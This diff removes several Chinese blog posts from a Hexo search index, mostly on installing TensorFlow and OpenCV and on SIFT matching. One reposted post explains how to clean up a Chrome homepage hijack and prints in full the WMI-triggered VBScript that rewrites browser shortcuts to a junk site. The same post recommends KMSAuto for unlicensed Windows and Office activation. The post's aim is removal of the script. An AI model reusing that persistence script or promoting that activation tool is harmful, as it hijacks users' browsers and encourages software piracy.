Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, pages 1902–1907, 2013. 2, 6 &#8617; 8. D. Cho, Y.-W. Tai, I. Kweon, D. Cho, Y.-W. Tai, and I. Kweon. Natural image matting using deep convolutional neural networks. In Proceedings of the European Conference on Computer Vision, 2016. 1, 2, 5, 6, 7, 8 &#8617; 9. Y.-Y. Chuang, B. Curless, D. H. Salesin, and R. Szeliski. A bayesian approach to digital matting. In Computer Vision and Pattern Recognition, 2001. CVPR 2001. Proceedings of the 2001 IEEE Computer Society Conference on, volume 2, pages II–264. IEEE, 2001. 1, 2 &#8617; 10. M. Erofeev, Y. Gitman, D. Vatolin, A. Fedorov, and J. Wang. Perceptually motivated benchmark for video matting. In Proceedings of the British Machine Vision Conference (BMVC), 2015. 1 &#8617; 11. M. Everingham, L. Van Gool, C. K. Williams, J. Winn, and A. Zisserman. The pascal visual object classes (voc) challenge. International journal of computer vision, 88(2):303– 338, 2010. 3 &#8617; 12. X. Feng, X. Liang, and Z. Zhang. A cluster sampling method for image matting via sparse coding. In European Conference on Computer Vision, pages 204–219. Springer, 2016. 2, 6 &#8617; 13. E. S. Gastal and M. M. Oliveira. Shared sampling for realtime alpha matting. In Computer Graphics Forum, volume 29, pages 575–584. Wiley Online Library, 2010. 1, 2, 5, 7, 8 &#8617; 14. L. Grady, T. Schiwietz, S. Aharon, and R. Westermann. Random walks for interactive alpha-matting. In Proceedings of VIIP, volume 2005, pages 423–429, 2005. 1, 2 &#8617; 15. B. He, G. Wang, C. Shi, X. Yin, B. Liu, and X. Lin. Iterative transductive learning for alpha matting. In 2013 IEEE International Conference on Image Processing, pages 4282– 4286. IEEE, 2013. 6 &#8617; 16. K. He, C. Rhemann, C. Rother, X. Tang, and J. Sun. A global sampling method for alpha matting. In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, 2011. 1, 2, 5, 7, 8 &#8617; 17. K. He, J. Sun, and X. Tang. Guided image filtering. In European conference on computer vision, pages 1–14. Springer, 2010. 5, 6 &#8617; 18. J. Johnson, E. S. Varnousfaderani, H. Cholakkal, , and D. Rajan. Sparse coding for alpha matting. IEEE Transactions on Image Processing, 2016. 2 &#8617; 19. L. Karacan, A. Erdem, and E. Erdem. Image matting with kl-divergence based sparse sampling. In Proceedings of the IEEE International Conference on Computer Vision, pages 424–432, 2015. 2, 6 &#8617; 20. D. Kingma and J. Ba. Adam: A method for stochastic optimization. International Conference on Learning Representations, 2015. 5 &#8617; 21. P. Lee and Y. Wu. Nonlocal matting. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, 2011. 2 &#8617; 22. A. Levin, D. Lischinski, and Y. Weiss. A closed-form solution to natural image matting. IEEE Transactions on Pattern Analysis and Machine Intelligence, 30(2):228–242, 2008. 1, 2, 5, 7, 8 &#8617; 23. T.-Y. Lin, M. Maire, S. Belongie, J. Hays, P. Perona, D. Ramanan, P. Dollar, and C. L. Zitnick. Microsoft coco: Com-´ mon objects in context. In European Conference on Computer Vision, pages 740–755. Springer, 2014. 3 &#8617; 24. D. Pathak, P. Krahenbuhl, J. Donahue, T. Darrell, and A. A. Efros. Context encoders: Feature learning by inpainting. In The IEEE Conference on Computer Vision and Pattern Recognition (CVPR), June 2016. 3 &#8617; 25. C. Rhemann, C. Rother, J. Wang, M. Gelautz, P. Kohli, and P. Rott. A perceptually motivated online benchmark for image matting. In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, 2009. 1, 2, 3, 5, 6 &#8617; 26. E. Shahrian, B. Price, S. Cohen, and D. Rajan. Temporally coherent and spatially accurate video matting. In Proceedings of Eurographics, 2012. 3 &#8617; 27. E. Shahrian and D. Rajan. Weighted color and texture sample selection for image matting. In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, 2012. 2 &#8617; 28. E. Shahrian, D. Rajan, B. Price, and S. Cohen. Improving image matting using comprehensive sampling sets. In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, pages 636–643, 2013. 1, 2, 5, 7, 8 &#8617; 29. X. Shen, X. Tao, H. Gao, C. Zhou, and J. Jia. Deep automatic portrait matting. In Proceedings of the European Conference on Computer Vision, 2016. 1, 2 &#8617; 30. K. Simonyan and A. Zisserman. Very deep convolutional networks for large-scale image recognition. CoRR, abs/1409.1556, 2014. 4 &#8617; 31. J. Sun, J. Jia, C.-K. Tang, and H.-Y. Shum. Poisson matting. In ACM Transactions on Graphics (ToG), volume 23, pages 315–321. ACM, 2004. 1, 2 &#8617; 32. J. Wang and M. F. Cohen. Optimized color sampling for robust matting. In 2007 IEEE Conference on Computer Vision and Pattern Recognition, pages 1–8. IEEE, 2007. 1, 2 &#8617; 33. J. Yang, B. Price, S. Cohen, H. Lee, and M.-H. Yang. Object contour detection with a fully convolutional encoder-decoder network. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, 2016. 3 &#8617; 34. Y. Zheng and C. Kambhamettu. Learning based digital matting. In 2009 IEEE 12th International Conference on Computer Vision, pages 889–896. IEEE, 2009. 5, 7, 8 &#8617; 由于单个图片排版较繁琐，方便起见直接从原论文截取图片，见谅。后面会研究下怎么能比较好的排版。]]></content>
-      <categories>
-        <category>译文</category>
-        <category>CV</category>
-      </categories>
-      <tags>
-        <tag>深度抠图</tag>
-        <tag>论文</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Windows 10 安装 TensorFlow]]></title>
-    <url>%2F2019%2F03%2F03%2FWindows-10-%E5%AE%89%E8%A3%85-TensorFlow%2F</url>
-    <content type="text"><![CDATA[本文针对 Windows 10 下 TensorFlow 的安装提供一些经验（包含 CPU 版及 GPU 版）。 TensorFlow CPU 版本安装基本软件需求： Python 3.6.*：安装时记得勾选 “ADD TO PATH” 安装： 1pip install --user --upgrade tensorflow 验证： 1python -c "import tensorflow as tf; tf.enable_eager_execution(); print(tf.reduce_sum(tf.random_normal([1000, 1000])))" TensorFlow GPU 版本安装基本软件需求： Python 3.6.* ：安装时记得勾选 “ADD TO PATH” Visual Studio NVIDIA® GPU drivers ：CUDA 9.0 要求驱动版本为 384.x 或更高。 CUDA® Toolkit ：TensorFlow 支持 CUDA 9.0. CUPTI ：包含在 CUDA Toolkit 中。 cuDNN SDK ：(&gt;= 7.2) (可选) NCCL 2.2 ：用于多 GPU 支持（因为个人设备限制，本文不作介绍） (可选) TensorRT 4.0 ：在某些模型上改进延迟和吞吐量以进行推理（机翻，本文亦不作介绍） 因为 CUDA® Toolkit 中包含 GPU 驱动，因此省去 GPU 安装介绍。 Visual Studio 安装Visual Studio 安装 CUDA 安装CUDA 9.0 下载链接 下载完成，双击根据提示进行安装。 程序应该会自动添加仅环境变量。 cuDNN 安装cuDNN 下载链接 选择 “I Agree To the Terms of the cuDNN Software License Agreement” 选择 “Download cuDNN v7.5.0 (Feb 21, 2019), for CUDA 9.0” 点击 “cuDNN Library for Windows 10” ，下载 将下载好的文件解压缩到某一路径 将 */cuda/bin */cuda/include */cuda/lib/x64 三个文件夹添加到环境变量 tensorflow-gpu 安装安装： 因为直接安装的话默认会安装 tensorflow-gpu 1.13.* ，但是貌似兼容性会有问题，在使用时会出错，所以我们选择安装 1.12 版本。 1pip install --ignore-installed --upgrade tensorflow-gpu==1.12 验证： 1234import tensorflow as tfhello = tf.constant("hello tensorflow")with tf.Session() as sess: print(sess.run(hello)) 从运行结果中，也可以很明显的看出程序使用了 GPU 资源。 参考tensorflow install jvishnuvardhan’s Installing-TensorFlow-GPU-on-Windows-10-TF1.12 官方经过测试的配置 一些经验虽然现在 GPU 内存都很大了，但不少人难免还在使用相对落后的笔记本电脑（比如我），可能 GPU 内存只有 2G ，这就会造成很多因为配置产生的问题。一个简单的例子就是 在运行 mnist 数据集的测试集时，会因为需要的内存较大而在一些显卡上无法运行。可以参考 ResourceExhaustedError in CNN/MNIST example (with GPU) #136 和 MNIST batch test #6764 ，其中提到了这个问题，并提供了解决办法，但是官方并为采纳。 所以，各位是安装 CPU 版还是 GPU 版还需根据自己电脑配置来斟酌。 最后部分链接在中国大陆或某些运营商宽度下可能速度较慢或无法访问，请自备科学上网工具以方便下载。 如有问题，请在科学上网前提下在评论中说明/指正。]]></content>
-      <categories>
-        <category>TensorFlow</category>
-      </categories>
-      <tags>
-        <tag>TensorFlow</tag>
-        <tag>Windows10</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[主题更换纪]]></title>
-    <url>%2F2018%2F12%2F29%2F%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%8D%A2%E7%BA%AA%2F</url>
-    <content type="text"><![CDATA[原本使用的 Material Theme 这两日使用起来很不舒服，页面滚动起来竟然会有些掉帧。于是就想着换个主题用用。由于心水 NexT 已久，所以就着手更换了。 参考主题文档。 安装并启用 NexT下载主题12cd bolggit clone https://github.com/iissnan/hexo-theme-next themes/next 启用主题打开站点根目录下 _config.yml 配置文件，编辑： 1theme: next 此时网站语言可能是英文，因为旧的主题语言设置可能与此主题不同，所以设置： 1language: zh-Hans 接着就看一下我们的新主题： 123hexo cleanhexo generatehexo server 根据提示在浏览器打开 http://localhost:4000 即可见到新主题芳容。 但总感觉哪里有些不对劲，所以需要继续进行配置。 主题设置选择 Scheme打开主题目录下 _config.yml 配置文件，更改： 1scheme: Pisces 这个是双栏模式，个人比较喜欢，其他可以查看文首链接。 菜单menu 下有多项设置可选，看需求设置就好。 如需自定页面，还需按需添加翻译信息（文件位置 languages/{language}.yml） 以上设置完成差不多就可以 deploy 了，其他细节慢慢添加。]]></content>
-      <categories>
-        <category>闲杂</category>
-      </categories>
-      <tags>
-        <tag>日志</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[安装 opencv-contrib 做 SIFT 特征匹配(Python)]]></title>
-    <url>%2F2018%2F06%2F05%2FUbuntu-%E4%B8%8B%E5%AE%89%E8%A3%85-opencv-contrib-%E5%81%9A-SIFT-%E7%89%B9%E5%BE%81%E5%8C%B9%E9%85%8D-Python%2F</url>
-    <content type="text"><![CDATA[因为 SIFT 算法的授权问题，导致 OpenCV 有两个版本，即如需使用 SIFT 算法就必须要用 OpenCV-contrib ，但是 VS2017 里配置 OpenCV-contrib 比较繁琐，使用 Python 就会方便很多。 Windows 下也可使用此方法，步骤大都如下，仅更改了标题，其余未作变动。 本文所使用环境： Ubuntu 16.04 LTS / Windows Python 2.7 安装 opencv-contrib 先安装 pip 软件包管理系统 打开一个 Terminal (快捷键 ctrl + alt + t ) 输入以下命令后回车，按提示操作 sudo apt-get install python-pip 安装 OpenCV-contrib Terminal 中输入以下命令，等待提示完成即可 pip install opencv-contrib-python 验证 Terminal 中执行以下命令验证是否安装成功 $ python import cv2 as cv print(cv.__version__) 安装成功会输出当前版本号 SIFT 特征匹配 代码 #sift feature import cv2 import numpy as np MIN_MATCH_COUNT = 4 imgname1 = &quot;1.jpg&quot; imgname2 = &quot;2.jpg&quot; ## (1) prepare data img1 = cv2.imread(imgname1) img2 = cv2.imread(imgname2) gray1 = cv2.cvtColor(img1, cv2.COLOR_BGR2GRAY) gray2 = cv2.cvtColor(img2, cv2.COLOR_BGR2GRAY) ## (2) Create SIFT object sift = cv2.xfeatures2d.SIFT_create() ## (3) Create flann matcher matcher = cv2.FlannBasedMatcher(dict(algorithm = 1, trees = 5), {}) ## (4) Detect keypoints and compute keypointer descriptors kpts1, descs1 = sift.detectAndCompute(gray1,None) kpts2, descs2 = sift.detectAndCompute(gray2,None) ## (5) knnMatch to get Top2 matches = matcher.knnMatch(descs1, descs2, 2) # Sort by their distance. matches = sorted(matches, key = lambda x:x[0].distance) ## (6) Ratio test, to get good matches. good = [m1 for (m1, m2) in matches if m1.distance &amp;lt; 0.7 * m2.distance] canvas = img2.copy() ## (7) find homography matrix if len(good)&amp;gt;MIN_MATCH_COUNT: ## (queryIndex for the small object, trainIndex for the scene ) src_pts = np.float32([ kpts1[m.queryIdx].pt for m in good ]).reshape(-1,1,2) dst_pts = np.float32([ kpts2[m.trainIdx].pt for m in good ]).reshape(-1,1,2) ## find homography matrix in cv2.RANSAC using good match points M, mask = cv2.findHomography(src_pts, dst_pts, cv2.RANSAC,5.0) #matchesMask2 = mask.ravel().tolist() h,w = img1.shape[:2] pts = np.float32([ [0,0],[0,h-1],[w-1,h-1],[w-1,0] ]).reshape(-1,1,2) dst = cv2.perspectiveTransform(pts,M) cv2.polylines(canvas,[np.int32(dst)],True,(0,255,0),3, cv2.LINE_AA) else: print( &quot;Not enough matches are found - {}/{}&quot;.format(len(good),MIN_MATCH_COUNT)) ## (8) drawMatches matched = cv2.drawMatches(img1,kpts1,canvas,kpts2,good,None)#,**draw_params) ## (9) Crop the matched region from scene h,w = img1.shape[:2] pts = np.float32([ [0,0],[0,h-1],[w-1,h-1],[w-1,0] ]).reshape(-1,1,2) dst = cv2.perspectiveTransform(pts,M) perspectiveM = cv2.getPerspectiveTransform(np.float32(dst),pts) found = cv2.warpPerspective(img2,perspectiveM,(w,h)) ## (10) save and display cv2.imwrite(&quot;matched.png&quot;, matched) cv2.imwrite(&quot;found.png&quot;, found) cv2.imshow(&quot;matched&quot;, matched); #cv2.imshow(&quot;found&quot;, found); cv2.waitKey();cv2.destroyAllWindows() 原始图像： 匹配结果：]]></content>
-      <categories>
-        <category>OpenCV</category>
-      </categories>
-      <tags>
-        <tag>OpenCV</tag>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[OpenCV 在 Visual Studio 中的使用]]></title>
-    <url>%2F2018%2F04%2F28%2FOpenCV-%E5%9C%A8-Visual-Studio-%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
-    <content type="text"><![CDATA[本文介绍了 VS2017 中配置 OpenCV 的方法。 因为 nonfree 的算法问题，重写部分内容，文中图片暂不更换，文件名及路径以文字为准。 PS: 文中理论上没有错误的地方了=￣ω￣= 因为某些原因，阅读体验较差 本文内容： OpenCV 的安装 Visual Studio 的安装 VS 中配置 OpenCV 所需环境及文件（仅供参考）： Windows 10 64 bit opencv-2.4.13.6-vc14.exe Visual Studio 2017 推荐使用 OpenCV-2.* 是因为可以更方便使用如 SIFT 等 nonfree 算法 OpenCV 的安装 下载在 OpenCV 的 GitHub 的 Releases 页面下载 opencv-2.4.13.6-vc14.exe 文件 （OpenCV 此页面也可下载到） 安装上述下载的文件为自解压文件，双击后选择要解压的目录即可（本文直接解压到 C 盘，后续用到的路径根据自己解压的路径自行替换） 添加环境变量右键此电脑 –&gt; 属性 –&gt; 高级系统设置 –&gt; 环境变量编辑系统变量的 Path 变量，添加 C:\opencv\build\x64\vc14\bin 此路径 Visual Studio 的安装 下载进入官方下载页面下载 Visual Studio Community 2017 版本 （确保你有微软账号，软件需要登陆，不登陆可能会有使用时间限制） 安装打开刚下载的软件，等待些许时间会进入 Visual Studio Installer , 选择 Visual Studio Community 2017 安装，接下来我们选择要安装的环境（本文选择 c++ ）如下图 (此处需要注意，C 盘务必保留充足空间，即使更换了安装位置还是要占用 C 盘部分空间) 接下来等待安装程序自动下载安装，时间长短依赖个人网速及电脑性能 VS 中配置 OpenCV大致需要三个步骤： 编译器添加 include 路径 编译器添加 lib 路径 编译器添加 lib 文件 新建一个空/控制台项目 添加一个源文件 配置 OpenCV 并运行测试代码 配置 红框处按图片上设置然后在新建的项目上右键然后选择属性 添加 C:\opencv\build\include 路径，注意红框处 添加 C:\opencv\build\x64\vc14\lib 路径 添加 opencv_ml2413d.libopencv_calib3d2413d.libopencv_contrib2413d.libopencv_core2413d.libopencv_features2d2413d.libopencv_flann2413d.libopencv_gpu2413d.libopencv_highgui2413d.libopencv_imgproc2413d.libopencv_legacy2413d.libopencv_objdetect2413d.libopencv_ts2413d.libopencv_video2413d.libopencv_nonfree2413d.libopencv_ocl2413d.libopencv_photo2413d.libopencv_stitching2413d.libopencv_superres2413d.libopencv_videostab2413d.lib这些库文件，Release mod 删除后缀前的 d 即可，其他版本根据具体版本修改每个文件中的数字（即版本号） 测试代码 将代码 copy 到刚刚新建的源文件并保存 /********************************************************** Name : Date : 2016/05/29 By : CharlotteHonG Final: 2016/05/29 **********************************************************/ #include &amp;lt;iostream&amp;gt; #include &amp;lt;opencv2/opencv.hpp&amp;gt; using namespace cv; int main(int argc, char const *argv[]) { /* 畫布 */ Mat img(270, 720, CV_8UC3, Scalar(56, 50, 38)); /* 直線 */ line(img, Point(20, 40), Point(120, 140), Scalar(255, 0, 0), 3); /* 實心方塊 */ rectangle(img, Point(150, 40), Point(250, 140), Scalar(0, 0, 255), -1); /* 實心圓 */ circle(img, Point(330, 90), 50, Scalar(0, 255, 0), -1); /* 空心橢圓 */ ellipse(img, Point(460, 90), Size(60, 40), 45, 0, 360, Scalar(255, 255, 0), 2); /* 不規則圖形 */ Point points[1][5]; int x = 40, y = 540; points[0][0] = Point(0 + y, 50 + x); points[0][1] = Point(40 + y, 0 + x); points[0][2] = Point(110 + y, 35 + x); points[0][3] = Point(74 + y, 76 + x); points[0][4] = Point(28 + y, 96 + x); const Point* ppt[1] = { points[0] }; int npt[] = { 5 }; polylines(img, ppt, npt, 1, 1, Scalar(0, 255, 255), 3); /* 繪出文字 */ putText(img, &quot;Test Passed !!&quot;, Point(10, 230), 0, 3, Scalar(255, 170, 130), 3); /* 開啟畫布 */ namedWindow(&quot;OpenCV Test By:Charlotte.HonG&quot;, WINDOW_AUTOSIZE); imshow(&quot;OpenCV Test By:Charlotte.HonG&quot;, img); waitKey(0); return 0; } 一切准备好了，现在，直接按 F5 运行即可。不出意外，你会看到下图，如果出现问题，请检查以上步骤。 关于 SIFT 算法的程序问题，新建项目时推荐新建 Windows控制台应用程序 ，网上的程序可能会因为配置的 OpenCV 的路径不同，无法在你的电脑上运行（即找不到头文件），所以如果你使用本文的方法配置环境，对于 OpenCV 的扩展头文件应使用如下形式： #include &quot;opencv2/highgui/highgui.hpp&quot; ps: 此方法在每次新建项目后都要重新配置，貌似是 vs2017 无法全局配置，可以尝试将配置导出，以后直接导入配置，应该会方便些，具体方法这里就不说了（或者其他的配置方式）。 本文部分内容及代码借鉴自此博主 Charlotte.HonG 的文章 [圖文] OpenCV 3.4.1 安裝配置在 Visual Studio 2017 （感谢 Charlotte.HonG ^_^）]]></content>
-      <categories>
-        <category>OpenCV</category>
-      </categories>
-      <tags>
-        <tag>OpenCV</tag>
-        <tag>VS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Chrome主页被篡改后如何解决？(部分内容转载)]]></title>
-    <url>%2F2018%2F01%2F22%2FChrome%E4%B8%BB%E9%A1%B5%E8%A2%AB%E7%AF%A1%E6%94%B9%E5%90%8E%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%EF%BC%9F%2F</url>
-    <content type="text"><![CDATA[不少朋友可能都遇到过浏览器的主页被恶意篡改成某些令人作呕的国产网页，具体哪些网站，我想必也不必多说，大家也都心知肚明。 篡改浏览器的主页有很多种途径，最常见的就是直接去修改应用程序的快捷方式的 Command line ，强制在默认代码后加入将被导向的流氓网址。用这种方法可以说是挺直接的，我们也最容易发现问题所在。下面转载一篇今天发现并用到的一篇文章，希望能够给您带来一些帮助。 以下为原文： 最近重装了一次电脑。尽管什么百度系的软件我都没有下载，Chrome浏览器的主页还是被硬生生劫持了。每次点开后的主页是http://hao.qquu8.com这个链接，紧接着它会跳向hao123。电脑上原装的其他浏览器（IE和Edge）也是这样，弄得每次打开浏览器就被恶心一下，很是恼火。 ![](https://pic1.zhimg.com/80/v2-caab8e64d2116cc4a155f646f8093218_hd.jpg) 我们先来看看问题在哪。右键快捷方式查看属性： ![](https://pic1.zhimg.com/50/v2-e22306ce7f2f7559ff99a1a6489a324b_hd.jpg) 哦，原来快捷方式被改了，后面加了一段url。把它删了试试？还是不行，几分钟后还是被改回来了。我在很多平台上找了解决办法。有的试了没有效果，重新开机后还是一样的毛病，有的推荐装“管家”，但这种以毒攻毒的办法无异于饮鸩止渴。最后终于有一种靠谱的方法，经过实验和一点修改，完美解决！主页被劫持的原理是一段通过WMI发起的定时自动运行脚本，WMI（Windows Management Instrumentation）可以理解成Windows系统后台运行的一个事件管理器。为查看WMI事件，先去下载WMITools并安装：WMI工具。之后打开WMI Event Viewer： ![](https://pic2.zhimg.com/50/v2-3246c0019fcd49aa591733efb67a0e10_hd.jpg) 点击左上角的笔的图标（Register For Events），在弹出的Connect to namespace的框直接点OK，Login的页面也直接点OK。点开左侧栏的EventFilter，再点击下级目录的项目： ![](https://pic1.zhimg.com/50/v2-4f424c287c30e2a2ef31acc14043c1c9_hd.jpg) 在右侧栏右键点击ActiveScriptEventConsumer，并通过view instant properties查看属性： ![](https://pic7.zhimg.com/50/v2-d6376daf291d17833f10b6976246af9b_hd.jpg) 在Script Text那一栏我们可以看到这段脚本：On Error Resume Next Const link = “http://hao.qquu8.com/?m=yx&amp;amp;r=j“Const link360 = “http://hao.qquu8.com/?m=yx&amp;amp;r=j&amp;amp;s=3“browsers = “114ie.exe,115chrome.exe,1616browser.exe,2345chrome.exe,2345explorer.exe,360se.exe,360chrome.exe,,avant.exe,baidubrowser.exe,chgreenbrowser.exe,chrome.exe,firefox.exe,greenbrowser.exe,iexplore.exe,juzi.exe,kbrowser.exe,launcher.exe,liebao.exe,maxthon.exe,niuniubrowser.exe,qqbrowser.exe,sogouexplorer.exe,srie.exe,tango3.exe,theworld.exe,tiantian.exe,twchrome.exe,ucbrowser.exe,webgamegt.exe,xbrowser.exe,xttbrowser.exe,yidian.exe,yyexplorer.exe”lnkpaths = “C:\Users\Public\Desktop,C:\ProgramData\Microsoft\Windows\Start Menu\Programs,C:\Users\sjtul\Desktop,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar,C:\Users\sjtul\AppData\Roaming\Microsoft\Windows\Start Menu\Programs”browsersArr = split(browsers,”,”)Set oDic = CreateObject(“scripting.dictionary”)For Each browser In browsersArr​ oDic.Add LCase(browser), browserNextlnkpathsArr = split(lnkpaths,”,”)Set oFolders = CreateObject(“scripting.dictionary”)For Each lnkpath In lnkpathsArr​ oFolders.Add lnkpath, lnkpathNextSet fso = CreateObject(“Scripting.Filesystemobject”)Set WshShell = CreateObject(“Wscript.Shell”)For Each oFolder In oFolders​ If fso.FolderExists(oFolder) Then​ For Each file In fso.GetFolder(oFolder).Files​ If LCase(fso.GetExtensionName(file.Path)) = “lnk” Then​ Set oShellLink = WshShell.CreateShortcut(file.Path)​ path = oShellLink.TargetPath​ name = fso.GetBaseName(path) &amp; “.” &amp; fso.GetExtensionName(path)​ If oDic.Exists(LCase(name)) Then​ If LCase(name) = LCase(“360se.exe”) Then​ oDicShellLink.Arguments = link360​ Else​ oShellLink.Arguments = link​ End If​ If file.Attributes And 1 Then​ fsoile.Attributes = file.Attributes - 1​ End If​ oShellLink.Save​ End If​ End If​ Next​ End IfNext&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;终于抓到了幕后黑手。可以看到这是一段VBScript代码，攻击目标涵盖了包括Chrome、360、Firefox、搜狗等30余种常见的浏览器。脚本以浏览器的安装地址为切入点，创建WshShell对象，进而生成植入了流氓网站的快捷方式。360浏览器有限定主页格式，于是这段脚本还特地修饰了流氓网站的链接。唉，流氓至此，也是服了。查到了源头如何清清除这段造孽的脚本呢？直接在WMI Event Viewer中将_EventFilter.Name="VBScriptKids_filter"右键删掉会被系统拒绝掉，需要去WMI Event Viewer的安装位置，右键以管理员方式运行exe文件才能删掉。之后还要把各个快捷方式都改回不带流氓网站的版本，包括桌面上的、开始菜单里的以及快速访问栏里的快捷方式，其中开始菜单里的快捷方式要去C:\ProgramData\Microsoft\Windows\Start Menu\Programs里改掉。唉，一趟下来真是让人心累，好在最终浏览器摆脱了流氓网站的劫持： ![](https://pic2.zhimg.com/50/v2-a571e709fb0cb04219e7f25489fd2272_hd.jpg) 当然在这时候，你可以点击之前下载的WMI安装包，把WMI系列工具卸载掉。最后提一下电脑中毒的原因。我分析是前几天用了小马激活这个工具来激活Windows系统，当时并没有激活成功反而还引来了病毒。推荐一款俄罗斯人开发的工具，可以成功激活Windows系统和Office软件，也不会招来一些流氓脚本：KMSAuto详见抢救被流氓网站劫持的浏览器主页 注： 转载自知乎 原作者： 七个太阳 原文链接： 为什么 Chrome 浏览器的主页会被篡改为 hao123 ？遇到这种情况要如何修复？ 七个太阳的回答 转载以经作者授权，如需二次转载，请务必联系原作者，在此感谢原作者的文章及授权。]]></content>
-      <categories>
-        <category>Tips</category>
-      </categories>
-      <tags>
-        <tag>chrome</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[给大学生的几条良心建议（转载）]]></title>
-    <url>%2F2017%2F05%2F19%2F%E7%BB%99%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%9A%84%E5%87%A0%E6%9D%A1%E8%89%AF%E5%BF%83%E5%BB%BA%E8%AE%AE%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89%2F</url>
-    <content type="text"><![CDATA[原文：by:stormzhang这篇文章是我写给小密圈中 20% 比例的大学生的，但是考虑到我公众号的读者中也有不少也是大学生或者研究生，所以姑且分享出来，希望对更多的还在校园的同学有所帮助与思考，更希望能够消除你们对未来的迷茫与恐慌。 绝大部分的大学教育都是渣 可能有人觉得话说的有点难听，但是事实就是如此，这不是大学的问题，本质上是中国教育的问题，中国的教育一向都是「灌输式」教学，成绩差跟成绩好的同学唯一的区别就是，成绩好的会很努力的去记那些理论性的东西，会非常在意自己的分数与奖项，成绩差的同学则比较懒，但不是笨，甚至很多人比成绩好的同学要聪明，但是本质上，他们都清一色的不知道自己所学的那些东西到底有什么用？这个才是最可悲的地方。 所以，如果你在学校的成绩比较好，那么别骄傲，你只不过会是在毕业后的应聘简历上多一条「大学奖学金获得者」而已，其他没什么特别大的优势，成绩差的也别灰心，你只是比较懒，不愿让自己的付出回报不成正比而已。那些学校好的与学校差的同学，也只是在学历上的一点优势而已，中国绝大部分的学校教育都缺乏讨论、缺乏思考、缺乏实践。 当然，名校肯定比一般的学校要好，这个毋庸置疑，而且平均水平肯定是名校比一般学校出来的人才更多，但是也只是平均而已，我跟比尔盖茨平均起来，我也是亿万富翁了，根本还是取决于个人。 你现在的专业跟你以后的工作可能没什么关系 很多毕业生毕业总是奢求能找到一份专业对口的工作，我告诉你，这很难，本质上也是因为中国的教育造成的，前面说到，你在学校学到的东西根本不知道以后干嘛用的。 拿计算机专业的举例，正是因为计算机专业的同学大学学了一堆什么计算机网络、操作系统，C 语言、数据结构等等，都是最最枯燥、最最乏味的课程，你学了四年，你从来不知道这些东西能做什么用？导致很多计算机专业的同学对自己的课程很厌恶，甚至到了抵触的心理，这也直接造成很多计算机专业的同学毕业后有很多去做了销售，等你工作后才发现，反而工作中从事编程行业的，却很多不是计算机专业的，有很多都是其他理科类专业的同学，而且这部分人大部分是因为毕业后工作接触到了编程，对此产生兴趣，知道这个能赚钱，所以发奋自学，从而走上了这一行。 所以，不管你是什么专业的，如果对本专业感兴趣，那还好，毕业之后尽量去找个专业相关的工作，如果对本专业不感兴趣，想从事别的行业，别担心，只要你感兴趣，肯用心去学习，那么一定不是问题，有时候甚至比那些科班生出身更有优势，因为这个职业是你自己出于兴趣以及回报而选择的，没有任何人逼你，你会更有动力去学习。 「学习能力」是大学四年学到的最重要技能 前面虽然把大学说的一无是处，有人会问，那干脆别读大学好了，这当然是不行的。虽然中国的大学教育有它各种各样的问题，但是这个时代，首先大学文凭是一个硬性规定，没有大学学历，你是很难在社会上立足的，起点会非常难。其次，大学跟高中的形式有着本质的区别，高中的教育是家长和老师的驱动下，面对种种压力你不得不去学习，所以高中的学习是压力下不得不去做的事。 但是大学可就不一样了，没人看着你，没人会关注到你，你有更多的自由与选择空间，玩什么，结实什么样的人，去不去上课都完全取决于你，我相信绝大部分大学生的考试复习大都集中在考试前的最后两周，这种学习完全是自我驱动的，所以，大学还是非常有必要上的，而且每个人最主要的区别可能就体现在了「学习能力」上，因为你会发现，大家都是上着同样的课，甚至有的人根本不去听课，但是同样是最后两周的自学冲刺，有的人就能轻松考过，或者考了很高的分数，有的人却学了很久依然考的不理想，这就是学习能力的差异。 即使是玩游戏，同样的时间，有的人玩的很好，会分析怎么出装更合理，团队战术怎么更容易取胜，有的人，却是一直沉迷于游戏，自制力很弱，而且还很有可能玩的不行。 所以，自制力很好，学习能力很不错的人，会在以后的职场有更多、更好的选择，而且也容易有更好的发展，即使这个人在大学喜欢玩游戏，即使在大学成绩很一般。 多动手，多实习 前面说了，大学学的都是一些理论性的东西，你根本不知道那些东西能干嘛，但是如果你能尽早去实习，尽早去参与实践，那你会有别样的体会。 举个例子，当计算机专业的同学都不知道所学的理论能干嘛的时候，你就去一家企业实习了，即使平时的工作只是打杂，但是你能真正认识了实际工作中是怎样的，别人在工作的时候用到了什么技能，看到别人拿到的高薪，你会发现原来，你所学的那些东西这么值钱，你会更有动力去学习，而且很有针对性的去学习，你得相信，理论与实践相结合，比那些只会闷头读书的人要有用的多，你想要的不是只在学校里空虚的考试分数而已，你更想要的是未来用自己的技能换取财富的能力！ 这些事情你该在大学就做了 我以一个过来人的经验，真心建议你们，大学这些事必须要做了，甚至比拿什么奖学金，考什么证还要重要。 多运动，坚持运动，有个好的身体比什么都重要。 多阅读，坚持阅读，哪怕跟你的专业无关的书籍。 考个驾照，一定要考，这个是 100% 所有工作之后的人最后悔的一件事，是的，就是 100%。 如果可以的话，谈场恋爱吧，哪怕最后以失败告终。 PS：以上就是我过来人的经验之谈，希望可以对更多的人有帮助，觉得有用，可以随手转发，谢谢。]]></content>
